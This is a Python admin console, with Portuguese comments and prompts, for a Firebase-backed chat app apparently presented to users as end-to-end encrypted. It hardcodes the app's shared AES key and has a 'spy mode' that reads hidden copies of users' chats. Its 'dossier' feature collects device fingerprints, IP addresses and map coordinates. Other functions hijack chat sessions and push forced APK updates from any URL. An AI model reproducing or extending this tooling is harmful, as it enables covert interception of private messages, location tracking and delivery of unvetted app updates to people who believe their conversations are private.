3#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import urllib.request
import urllib.error
import hashlib
import threading
import base64
from datetime import datetime
import traceback

# Using native pycryptodome if available, else fallback for AES
try:
    # pyrefly: ignore [missing-import]
    from Crypto.Cipher import AES
    # pyrefly: ignore [missing-import]
    from Crypto.Util.Padding import pad, unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

SECRET_KEY = "CHAVE_SECRETA_SUPER_FODA_AES"

def decrypt_cryptojs(encrypted_b64, passphrase):
    try:
        data = base64.b64decode(encrypted_b64)
        if data[:8] != b'Salted__': return encrypted_b64
        salt = data[8:16]
        key_iv = bytes()
        prev = bytes()
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + passphrase.encode('utf-8') + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data[16:])
        padding_len = decrypted[-1]
        return decrypted[:-padding_len].decode('utf-8')
    except Exception:
        return f"[ERRO DECRYPT] {encrypted_b64[:20]}..."

def encrypt_cryptojs(text, passphrase):
    try:
        salt = os.urandom(8)
        key_iv = bytes()
        prev = bytes()
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + passphrase.encode('utf-8') + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        text_bytes = text.encode('utf-8')
        padding_len = 16 - (len(text_bytes) % 16)
        padded_text = text_bytes + bytes([padding_len] * padding_len)
        encrypted = cipher.encrypt(padded_text)
        return base64.b64encode(b'Salted__' + salt + encrypted).decode('utf-8')
    except Exception:
        return text

class Colors:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_CYAN = "\033[96m"
    MAGENTA = "\033[35m"
    BRIGHT_MAGENTA = "\033[95m"

FIREBASE_DB_URL = "https://cipher-chat-dougobrasil-default-rtdb.firebaseio.com"
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Colors.BRIGHT_CYAN}
   _____ _       _               _______        _    
  / ____(_)     | |             |__   __|      | |   
 | |     _ _ __ | |__   ___ _ __   | | _____  _| |_  
 | |    | | '_ \| '_ \ / _ \ '__|  | |/ _ \ \/ / __| 
 | |____| | |_) | | | |  __/ |     | |  __/>  <| |_  
  \_____|_| .__/|_| |_|\___|_|     |_|\___/_/\_\\__| 
          {Colors.BOLD}{Colors.BRIGHT_GREEN}[ ENTERPRISE ADMIN PANEL v2.0 ]{Colors.RESET}
    """
    print(banner)

def _firebase_req(endpoint: str, method: str = "GET", data=None) -> tuple:
    url = f"{FIREBASE_DB_URL}/{endpoint.lstrip('/')}.json"
    headers = {"User-Agent": DEFAULT_USER_AGENT, "Content-Type": "application/json"}
    
    body_bytes = None
    if data is not None:
        body_bytes = json.dumps(data).encode('utf-8')

    req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode('utf-8')
            return response.status, json.loads(res_data) if res_data and res_data != 'null' else None
    except urllib.error.HTTPError as e:
        return e.code, None
    except Exception:
        return 0, None

def get_ip_location(ip_address: str) -> dict:
    if not ip_address or ip_address in ["Unknown", "127.0.0.1", "localhost", "N/A"]:
        return {}
    
    url = f"http://ip-api.com/json/{ip_address}?fields=status,message,country,regionName,city,lat,lon,isp,org,query"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_USER_AGENT})
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                data = json.loads(response.read().decode('utf-8'))
                if data.get('status') == 'success':
                    return data
    except Exception:
        pass
    return {}

# ----------------- CRIPTOGRAFIA (PYTHON E2E) -----------------
# Implementa a mesma lógica AES-256 do React Native (CryptoJS)
# Chave secreta hardcoded da mesma forma que está no React Native (App)
SECRET_KEY = hashlib.sha256(b"CHAVE_SECRETA_SUPER_FODA_AES").digest()

def encrypt_message(plain_text):
    if not CRYPTO_AVAILABLE:
        return f"[ERRO-CRIPTO: Instale pycryptodome] {plain_text}"
    try:
        cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
        ct_bytes = cipher.encrypt(pad(plain_text.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception as e:
        return f"ENCRYPT_ERR: {e}"

def decrypt_message(cipher_text):
    if not CRYPTO_AVAILABLE:
        return f"[ENC] {cipher_text}"
    try:
        ct = base64.b64decode(cipher_text)
        cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        return f"DECRYPT_ERR: {cipher_text}"

# ----------------- TERMINAL CHAT (SINC) -----------------

def terminal_chat(target_user):
    print(f"\n{Colors.BRIGHT_GREEN}[>] INICIANDO CONEXÃO SEGURO COM {target_user.upper()}...{Colors.RESET}")
    st, tgt_data = _firebase_req(f"users/{target_user}")
    
    if st != 200 or not tgt_data:
        print(f"{Colors.RED}[!] Erro: Usuário alvo não existe.{Colors.RESET}")
        input("Pressione ENTER para voltar...")
        return

    me = "ADMIN"
    room_id = f"{me}_{target_user}"
    
    # Send invite
    invite = {
        "from": me,
        "room_id": room_id,
        "status": "PENDING",
        "timestamp": time.time()
    }
    _firebase_req(f"chat_invites/{target_user}", method="PUT", data=invite)
    
    # Prepare room
    _firebase_req(f"lobby/{room_id}", method="PUT", data={"created_at": time.time(), "users": [me, target_user]})
    
    print(f"{Colors.GREEN}[>] TÚNEL ESTABELECIDO. O USUÁRIO PODERÁ VISUALIZAR O CONVITE NA TELA.{Colors.RESET}")
    print(f"{Colors.CYAN}[!] Criptografia Local Removida (Modo Compatibilidade). Digite '/sair' para encerrar.{Colors.RESET}\n")

    chat_running = [True]
    last_msg_ts = [0]
    processed_msgs = set()

    def poll_messages():
        import sys
        while chat_running[0]:
            try:
                # O admin lê as mensagens que o target_user atirou na gaveta 'ephemeral_messages/admin'
                st_m, msgs = _firebase_req("ephemeral_messages/admin")
                if st_m == 200 and msgs:
                    # msgs is a dict of push_ids
                    sorted_msgs = sorted(msgs.items(), key=lambda x: x[1].get('timestamp', 0))
                    for k, v in sorted_msgs:
                        if k not in processed_msgs:
                            processed_msgs.add(k)
                            if v.get('sender') == target_user:
                                enc_text = v.get('text', '')
                                
                                # Admin tenta descriptografar pois o app agora manda AES
                                try:
                                    if enc_text.startswith("U2Fz"): # Base64 signature for AES
                                        decrypted = decrypt_cryptojs(enc_text, SECRET_KEY)
                                    else:
                                        decrypted = enc_text
                                except Exception:
                                    decrypted = f"[Criptografado] {enc_text[:15]}..."

                                sys.stdout.write(f"\r{Colors.BRIGHT_RED}[{target_user.upper()}]{Colors.RESET}: {decrypted}\n")
                                sys.stdout.write(f"{Colors.BRIGHT_GREEN}[{me}]{Colors.RESET}: ")
                                sys.stdout.flush()
                                # Clean up read messages
                                _firebase_req(f"ephemeral_messages/admin/{k}", method="DELETE")
            except Exception:
                pass
            time.sleep(1.5)

    poll_thread = threading.Thread(target=poll_messages, daemon=True)
    poll_thread.start()

    while chat_running[0]:
        try:
            msg = input(f"{Colors.BRIGHT_GREEN}[{me}]{Colors.RESET}: ")
            if msg.strip() == "/sair":
                chat_running[0] = False
                break
            
            if msg.strip():
                # Envia mensagem CRIPTOGRAFADA para gaveta do alvo
                encrypted_msg = encrypt_cryptojs(msg.strip(), SECRET_KEY)
                payload = {
                    "sender": me,
                    "text": encrypted_msg,
                    "timestamp": time.time(),
                    "type": "text"
                }
                push_id = base64.b64encode(os.urandom(6)).decode('utf-8').replace('+', '').replace('/', '')
                _firebase_req(f"ephemeral_messages/{target_user}/{push_id}", method="PUT", data=payload)
        except KeyboardInterrupt:
            chat_running[0] = False
            break
        except Exception:
            pass
    
    print(f"\n{Colors.YELLOW}[*] Destruindo túnel de chat...{Colors.RESET}")
    _firebase_req(f"ephemeral_messages/admin", method="DELETE")
    _firebase_req(f"lobby/{room_id}", method="DELETE")
    _firebase_req(f"chat_invites/{target_user}", method="DELETE")
    _firebase_req(f"chat_signals/{room_id}", method="PUT", data=f"CLOSE_{me}")
    print(f"{Colors.GREEN}[+] Túnel destruído.{Colors.RESET}")
    input("Pressione ENTER...")

def _send_expo_push(token: str, title: str, body: str) -> tuple:
    if not token or not token.startswith("Expo"):
        return False, "Invalid Token"
    
    url = "https://exp.host/--/api/v2/push/send"
    headers = {
        "Accept": "application/json",
        "Accept-encoding": "gzip, deflate",
        "Content-Type": "application/json",
    }
    
    payload = {
        "to": token,
        "sound": "default",
        "title": title,
        "body": body,
        "channelId": "default"
    }
    
    try:
        req = urllib.request.Request(url, data=json.dumps(payload).encode('utf-8'), headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=10) as response:
            if response.status == 200:
                res = json.loads(response.read().decode('utf-8'))
                if res.get('data') and len(res['data']) > 0:
                    status = res['data'][0].get('status')
                    if status == 'ok':
                        return True, "Success"
                    else:
                        details = res['data'][0].get('details', {})
                        err_msg = details.get('error', 'Unknown Error')
                        return False, f"Expo Error: {err_msg}"
            return False, "HTTP Request Failed"
    except Exception as e:
        return False, str(e)

def format_ts(ts):
    try:
        val = float(ts)
        # Se for maior que 20 bilhões, é milissegundos.
        if val > 20000000000:
            val = val / 1000.0
        return datetime.fromtimestamp(val).strftime('%d/%m/%Y %H:%M:%S')
    except Exception:
        return str(ts)

def user_dossier(user_input=None):
    user = user_input
    if not user:
        user = input(f"\n{Colors.CYAN}Username para dossiê:{Colors.RESET} ").strip().lower()
    
    if not user: return
    st, data = _firebase_req(f"users/{user}")
    if st == 200 and data:
        print(f"\n{Colors.BOLD}--- DOSSIÊ DE USUÁRIO: {user.upper()} ---{Colors.RESET}")
        print(f"[{Colors.GREEN}+{Colors.RESET}] Status da Conta: {'Ativa' if data.get('active', True) else 'BLOQUEADA'}")
        print(f"[{Colors.GREEN}+{Colors.RESET}] Licença Expira em: {format_ts(data.get('expiration_timestamp'))}")
        
        st_p, presence = _firebase_req(f"presence/{user}")
        is_online = True if st_p == 200 and presence else False
        active_chat = data.get("active_chat_with")
        
        print(f"[{Colors.GREEN}+{Colors.RESET}] Online agora: {'Sim' if is_online else 'Não'}")
        if active_chat:
            print(f"[{Colors.BRIGHT_MAGENTA}!{Colors.RESET}] EM SESSÃO ATIVA COM: {Colors.BRIGHT_RED}{active_chat.upper()}{Colors.RESET}")
        
        device = data.get("last_device")
        if device:
            print(f"\n{Colors.YELLOW}[!] FINGERPRINT DO DISPOSITIVO REGISTRADO{Colors.RESET}")
            print(f"    ├─ Modelo: {device.get('modelName', 'N/A')}")
            print(f"    ├─ Marca: {device.get('brand', 'N/A')}")
            print(f"    ├─ OS: {device.get('osName', 'N/A')} {device.get('osVersion', 'N/A')}")
            print(f"    ├─ Build ID (OS): {device.get('osBuildId', 'N/A')}")
            
            mem = device.get('totalMemory')
            mem_str = f"{round(mem / (1024**3), 2)} GB" if isinstance(mem, (int, float)) else "N/A"
            print(f"    ├─ Memória RAM Total: {mem_str}")
            
            bat = device.get('batteryLevel')
            bat_state = device.get('batteryState')
            bat_str = f"{round(bat * 100)}% (Estado: {bat_state})" if isinstance(bat, (int, float)) else "N/A"
            print(f"    ├─ Bateria: {bat_str}")
            print(f"    ├─ Impressão Digital (Android ID): {Colors.BRIGHT_RED}{device.get('androidId', 'N/A')}{Colors.RESET}")
            
            ip_public = device.get('publicIp', 'N/A')
            ip_private = device.get('privateIp', 'N/A')
            print(f"    ├─ IP Público: {ip_public}")
            print(f"    ├─ IP Privado (LAN): {ip_private}")
            
            # Formatar detalhes de rede se disponíveis
            net_state = device.get('networkState', {})
            is_connected = net_state.get('isConnected')
            net_type = net_state.get('type', 'N/A')
            print(f"    ├─ Rede Conectada: {'Sim' if is_connected else 'Não'} (Tipo: {net_type})")
            
            print(f"    └─ Último Login Capturado: {format_ts(device.get('timestamp'))}")

            # Geolocalização baseada sempre no IP Público
            ip_target = ip_public if ip_public not in ["Unknown", "127.0.0.1", "localhost", "N/A"] else ip_private
            
            if ip_target and ip_target not in ["Unknown", "127.0.0.1", "localhost", "N/A"]:
                print(f"\n{Colors.BLUE}[*] BUSCANDO LOCALIZAÇÃO DO IP {ip_target}...{Colors.RESET}")
                geo = get_ip_location(ip_target)
                if geo:
                    print(f"    ├─ ISP / Provedor: {geo.get('isp', 'N/A')} / {geo.get('org', 'N/A')}")
                    print(f"    ├─ Local: {geo.get('city', 'N/A')} - {geo.get('regionName', 'N/A')} ({geo.get('country', 'N/A')})")
                    print(f"    ├─ Coordenadas: Lat {geo.get('lat', 'N/A')}, Lon {geo.get('lon', 'N/A')}")
                    
                    maps_link = f"https://www.google.com/maps/search/?api=1&query={geo.get('lat')},{geo.get('lon')}"
                    print(f"    └─ Google Maps: {Colors.CYAN}{Colors.BOLD}{maps_link}{Colors.RESET}")
                    
                    open_maps = input(f"\n    > Deseja abrir a localização no navegador? (S/N): ").strip().upper()
                    if open_maps == 'S':
                        if os.name == 'nt':
                            os.system(f"start {maps_link}")
                        elif sys.platform == "darwin":
                            os.system(f"open {maps_link}")
                        else:
                            os.system(f"xdg-open {maps_link}")
                else:
                    print(f"    └─ {Colors.RED}Falha ao localizar o IP. Pode ser um IP de rede interna ou o limite de requisições esgotou.{Colors.RESET}")

        else:
            print(f"\n{Colors.YELLOW}[!] Nenhum fingerprint de dispositivo registrado.{Colors.RESET}")
            
        store_activity = data.get("store_activity")
        if store_activity:
            print(f"\n{Colors.YELLOW}[!] HISTÓRICO DA LOJA SECRETA{Colors.RESET}")
            # order by timestamp
            activities = sorted(store_activity.values(), key=lambda x: x.get('timestamp', 0))
            for act in activities:
                print(f"    ├─ [{format_ts(act.get('timestamp'))}] Produto: {Colors.CYAN}{act.get('title')}{Colors.RESET} | Preço: {Colors.GREEN}{act.get('price')}{Colors.RESET}")
            print(f"    └─ Total de Interações: {len(activities)}")
        else:
            print(f"\n{Colors.YELLOW}[!] Nenhuma interação na Loja registrada.{Colors.RESET}")
        
    else:
        print(f"{Colors.RED}Usuário não encontrado.{Colors.RESET}")
    input("\nPressione ENTER...")

def user_management_submenu():
    while True:
        clear_screen()
        print_banner()
        print(f"{Colors.BOLD}[ PESQUISA E GERENCIAMENTO DE USUÁRIO ]{Colors.RESET}\n")
        print(f" {Colors.CYAN}Opções Especiais:{Colors.RESET}")
        print(f"  {Colors.YELLOW}*{Colors.RESET} - Gerar Lote de Usuários (Revenda)")
        print(f"  {Colors.YELLOW}vazio{Colors.RESET} - Listar Todos os Usuários")
        print(f"  {Colors.YELLOW}0{Colors.RESET} - Voltar")
        
        user = input(f"\n{Colors.CYAN}Digite a opção ou o Username do Alvo:{Colors.RESET} ").strip().lower()
        
        if user == "0": break
        elif user == "*":
            qty = input("Quantidade de acessos a gerar: ").strip()
            days = input("Dias de validade por acesso: ").strip()
            if qty.isdigit() and days.isdigit():
                qty = int(qty)
                import uuid
                print(f"\n{Colors.BLUE}Gerando {qty} contas...{Colors.RESET}")
                for i in range(qty):
                    new_user = f"user_{str(uuid.uuid4())[:6]}"
                    pwd = str(uuid.uuid4())[:8]
                    pwd_hash = hashlib.sha256(pwd.encode('utf-8')).hexdigest()
                    payload = {
                        "username": new_user,
                        "password": pwd_hash,
                        "active": True,
                        "expiration_timestamp": 0,
                        "days_valid": days
                    }
                    _firebase_req(f"users/{new_user}", method="PUT", data=payload)
                    print(f"[{i+1}] {new_user} | {pwd}")
                print(f"{Colors.GREEN}Lote gerado com sucesso! Salve essas credenciais.{Colors.RESET}")
            input("\nPressione ENTER...")
            continue
        elif not user:
            st, users = _firebase_req("users")
            print(f"\n{Colors.BOLD}{'USUÁRIO':<20} | {'STATUS':<10} | {'LICENÇA'}{Colors.RESET}")
            print("-" * 55)
            if st == 200 and users:
                for u, data in users.items():
                    if isinstance(data, dict):
                        sts = f"{Colors.BRIGHT_GREEN}ATIVO{Colors.RESET}" if data.get("active", True) else f"{Colors.BRIGHT_RED}BLOQ.{Colors.RESET}"
                        exp = format_ts(data.get("expiration_timestamp"))
                        print(f"{u:<20} | {sts:<19} | {exp}")
            input("\nPressione ENTER...")
            continue
            
        # Tenta buscar o usuário
        st, data = _firebase_req(f"users/{user}")
        if st == 200 and data:
            while True:
                clear_screen()
                print_banner()
                print(f"{Colors.BOLD}[ GERENCIANDO ALVO: {Colors.BRIGHT_RED}{user.upper()}{Colors.RESET} ]\n")
                print(f" {Colors.CYAN}1.{Colors.RESET} Gerar Dossiê Completo (IP, Aparelho, Localização)")
                print(f" {Colors.CYAN}2.{Colors.RESET} Bloquear / Desbloquear Conta")
                print(f" {Colors.CYAN}3.{Colors.RESET} Renovar Licença (Adicionar Dias)")
                print(f" {Colors.CYAN}4.{Colors.RESET} Remover Conta Permanentemente")
                print(f" {Colors.BRIGHT_MAGENTA}5.{Colors.RESET} Interceptar Sessão (Terminal Chat)")
                print(f" {Colors.YELLOW}6.{Colors.RESET} MODO ESPIÃO (Monitorar Conversas Ao Vivo)")
                print(f" {Colors.CYAN}7.{Colors.RESET} Configurar Chave Camuflagem (Stealth Mode)")
                print(f" {Colors.WHITE}0.{Colors.RESET} Voltar à Pesquisa")
                
                sub_opt = input("\n> ")
                if sub_opt == "0": break
                elif sub_opt == "1":
                    user_dossier(user)
                    input("\nPressione ENTER...")
                elif sub_opt == "2":
                    new_status = not data.get("active", True)
                    _firebase_req(f"users/{user}/active", method="PUT", data=new_status)
                    print(f"{Colors.GREEN}Status de '{user}' alterado para {'ATIVO' if new_status else 'BLOQUEADO'}.{Colors.RESET}")
                    input("\nPressione ENTER...")
                    # Update local data var
                    st, data = _firebase_req(f"users/{user}")
                elif sub_opt == "3":
                    dias = input("Adicionar quantos dias? ").strip()
                    if dias.isdigit():
                        cur = data.get("expiration_timestamp", time.time())
                        cur = max(cur, time.time())
                        _firebase_req(f"users/{user}/expiration_timestamp", method="PUT", data=cur + int(dias)*86400)
                        print(f"{Colors.GREEN}Licença estendida!{Colors.RESET}")
                    input("\nPressione ENTER...")
                elif sub_opt == "4":
                    conf = input(f"{Colors.RED}Tem certeza que deseja APAGAR {user}? (s/n): {Colors.RESET}")
                    if conf.lower() == 's':
                        _firebase_req(f"users/{user}", method="DELETE")
                        print(f"{Colors.GREEN}Usuário apagado!{Colors.RESET}")
                        input("\nPressione ENTER...")
                        break
                elif sub_opt == "5":
                    terminal_chat(user)
                elif sub_opt == "6":
                    spy_mode(user)
                elif sub_opt == "7":
                    new_key = input("Digite a nova chave (ex: admin123): ").strip()
                    if new_key:
                        _firebase_req(f"users/{user}/settings/stealthKey", method="PUT", data=new_key)
                        print(f"{Colors.GREEN}Chave Stealth configurada para {new_key}!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[!] O usuário deve fazer login pelo menos uma vez para o app baixar essa chave.{Colors.RESET}")
                    input("\nPressione ENTER...")
        else:
            print(f"\n{Colors.YELLOW}Usuário não encontrado. Deseja criar?{Colors.RESET}")
            ans = input("(s/n): ").strip().lower()
            if ans == 's':
                pwd = input("Senha: ").strip()
                pwd_hash = hashlib.sha256(pwd.encode('utf-8')).hexdigest()
                dias = input("Validade em dias (Padrão 30): ").strip()
                dias = dias if dias.isdigit() else "30"
                # Usa days_valid para ativar apenas no primeiro login
                payload = {"username": user, "password": pwd_hash, "active": True, "expiration_timestamp": 0, "days_valid": dias}
                _firebase_req(f"users/{user}", method="PUT", data=payload)
                print(f"{Colors.GREEN}Usuário '{user}' criado com sucesso! Validade ativada no primeiro login.{Colors.RESET}")
                input("\nPressione ENTER para gerenciar...")

def spy_mode(user):
    print(f"\n{Colors.BRIGHT_MAGENTA}[*] MODO ESPIÃO ATIVADO PARA: {user.upper()}{Colors.RESET}")
    print(f"{Colors.CYAN}[!] O painel interceptará as mensagens atiradas na sala de logs invisíveis do alvo.{Colors.RESET}")
    print(f"{Colors.CYAN}[!] Para fechar o monitoramento, pressione CTRL+C.{Colors.RESET}\n")
    
    # We will poll the "spy_logs" which the app dual-writes to.
    processed = set()
    
    try:
        while True:
            # We don't know the exact room ID unless we check active_chat_with
            st, data = _firebase_req(f"users/{user}")
            if st != 200 or not data: break
            
            active_chat = data.get("active_chat_with")
            if not active_chat:
                sys.stdout.write(f"\r{Colors.YELLOW}[AGUARDANDO] {user.upper()} não está em nenhum chat...{Colors.RESET}      ")
                sys.stdout.flush()
                time.sleep(2)
                continue
                
            users = sorted([user, active_chat])
            room_id = f"{users[0]}_{users[1]}"
            sys.stdout.write(f"\r{Colors.BRIGHT_MAGENTA}[INTERCEPTANDO CONEXÃO]: {user.upper()} <=> {active_chat.upper()}...{Colors.RESET}   \n")
            
            st_log, logs = _firebase_req(f"spy_logs/{room_id}")
            if st_log == 200 and logs:
                sorted_logs = sorted(logs.items(), key=lambda x: x[1].get('timestamp', 0))
                for k, v in sorted_logs:
                    if k not in processed:
                        processed.add(k)
                        sender = v.get('sender', '???')
                        enc_text = v.get('text', '')
                        
                        # Tenta descriptografar usando a chave mestre
                        try:
                            if enc_text.startswith("U2Fz"):
                                text = decrypt_cryptojs(enc_text, SECRET_KEY)
                            else:
                                text = enc_text
                        except Exception:
                            text = f"[CRIPTOGRAFADO] {enc_text[:20]}..."
                            
                        print(f"{Colors.YELLOW}[{format_ts(v.get('timestamp'))}] {Colors.BRIGHT_RED}{sender.upper()}{Colors.RESET}: {text}")
            time.sleep(1.5)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}[*] Modo Espião Desligado.{Colors.RESET}")
        return

def system_announcements():
    while True:
        clear_screen()
        print_banner()
        print(f"{Colors.BOLD}[ GERENCIAMENTO DE ANÚNCIOS DA LOJA ]{Colors.RESET}\n")
        
        # Puxa anúncios atuais
        st, ads = _firebase_req("app_config/announcements")
        ads_list = []
        if isinstance(ads, dict):
            ads_list = list(ads.values())
        elif isinstance(ads, list):
            ads_list = [a for a in ads if a]
            
        for idx, ad in enumerate(ads_list):
            if isinstance(ad, dict):
                print(f" {Colors.YELLOW}[{idx+1}]{Colors.RESET} {ad.get('title', 'Sem Título')} - {ad.get('url', 'Sem Link')}")
            else:
                print(f" {Colors.YELLOW}[{idx+1}]{Colors.RESET} [Antigo] {ad}")
            
        print(f"\n {Colors.CYAN}1.{Colors.RESET} Adicionar Novo Anúncio")
        print(f" {Colors.CYAN}2.{Colors.RESET} Apagar um Anúncio")
        print(f" {Colors.BRIGHT_RED}3.{Colors.RESET} Forçar Atualização do Aplicativo (OTA Update)")
        print(f" {Colors.WHITE}0.{Colors.RESET} Voltar")
        
        opt = input("\n> ")
        if opt == "0": break
        elif opt == "1":
            title = input("Título do Anúncio: ").strip()
            text = input("Texto do Anúncio: ").strip()
            btn_text = input("Texto do Botão (ex: COMPRAR): ").strip()
            url = input("Link (ex: https://...): ").strip()
            
            new_ad = {"title": title, "text": text, "btnText": btn_text, "url": url}
            ads_list.append(new_ad)
            
            _firebase_req("app_config/announcements", method="PUT", data=ads_list)
            print(f"{Colors.GREEN}Anúncio adicionado!{Colors.RESET}")
            input("\nPressione ENTER...")
            
        elif opt == "2":
            try:
                idx_remove = int(input("Número do anúncio para apagar: ").strip()) - 1
                if 0 <= idx_remove < len(ads_list):
                    ads_list.pop(idx_remove)
                    _firebase_req("app_config/announcements", method="PUT", data=ads_list)
                    print(f"{Colors.GREEN}Anúncio removido!{Colors.RESET}")
                else:
                    print(f"{Colors.RED}Opção inválida.{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}Número inválido.{Colors.RESET}")
            input("\nPressione ENTER...")
            
        elif opt == "3":
            print(f"\n{Colors.BRIGHT_RED}[!] ATENÇÃO: Isso travará os apps desatualizados instantaneamente.{Colors.RESET}")
            version = input("Nova Versão (Ex: 2.1.0): ").strip()
            if version:
                url = input("Link Direto do APK de Atualização: ").strip()
                payload = {"version": version, "url": url, "timestamp": time.time()}
                _firebase_req("app_config/update", method="PUT", data=payload)
                print(f"{Colors.GREEN}Sistema de Atualização (OTA) ativado para v{version}!{Colors.RESET}")
            input("\nPressione ENTER...")

def store_management_submenu():
    while True:
        clear_screen()
        print_banner()
        print(f"{Colors.BOLD}[ GERENCIAMENTO DA LOJA SECRETA ]{Colors.RESET}\n")
        
        st, items = _firebase_req("app_config/store_items")
        store_items = items if st == 200 and items else {}
        items_list = []
        for k, v in store_items.items():
            if isinstance(v, dict):
                v['id'] = k
                items_list.append(v)
                
        print(f" {Colors.CYAN}Produtos Atuais:{Colors.RESET}")
        if not items_list:
            print("  Nenhum produto cadastrado.")
        else:
            for idx, prod in enumerate(items_list):
                print(f"  [{idx+1}] {prod.get('title')} - {prod.get('price')}")
                
        print(f"\n {Colors.CYAN}1.{Colors.RESET} Adicionar Novo Produto")
        print(f" {Colors.CYAN}2.{Colors.RESET} Remover Produto")
        print(f" {Colors.WHITE}0.{Colors.RESET} Voltar")
        
        opt = input("\nSelecione uma operação: ")
        
        if opt == "0": break
        elif opt == "1":
            title = input("Título do Produto: ").strip()
            desc = input("Descrição Curta: ").strip()
            price = input("Preço (ex: R$ 50,00): ").strip()
            url = input("Link de Checkout (MisticPay): ").strip()
            
            import uuid
            new_id = f"item_{str(uuid.uuid4())[:8]}"
            payload = {"title": title, "desc": desc, "price": price, "url": url}
            
            _firebase_req(f"app_config/store_items/{new_id}", method="PUT", data=payload)
            print(f"{Colors.GREEN}Produto adicionado com sucesso!{Colors.RESET}")
            input("\nPressione ENTER...")
            
        elif opt == "2":
            try:
                idx_remove = int(input("Número do produto para apagar: ").strip()) - 1
                if 0 <= idx_remove < len(items_list):
                    del_id = items_list[idx_remove]['id']
                    _firebase_req(f"app_config/store_items/{del_id}", method="DELETE")
                    print(f"{Colors.GREEN}Produto removido!{Colors.RESET}")
                else:
                    print(f"{Colors.RED}Opção inválida.{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}Número inválido.{Colors.RESET}")
            input("\nPressione ENTER...")

def main_menu():
    while True:
        clear_screen()
        print_banner()
        print(f" {Colors.CYAN}1.{Colors.RESET} Gerenciar Usuários e Dispositivos")
        print(f" {Colors.CYAN}2.{Colors.RESET} Comunicados e Atualizações")
        print(f" {Colors.CYAN}3.{Colors.RESET} Loja Secreta (Gerenciar Produtos)")
        print(f" {Colors.WHITE}0.{Colors.RESET} Sair")
        
        opt = input("\nSelecione uma operação: ")
        
        if opt == "1": user_management_submenu()
        elif opt == "2": system_announcements()
        elif opt == "3": store_management_submenu()
        elif opt == "0": break

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Painel encerrado pelo usuário.{Colors.RESET}")
        sys.exit(0)
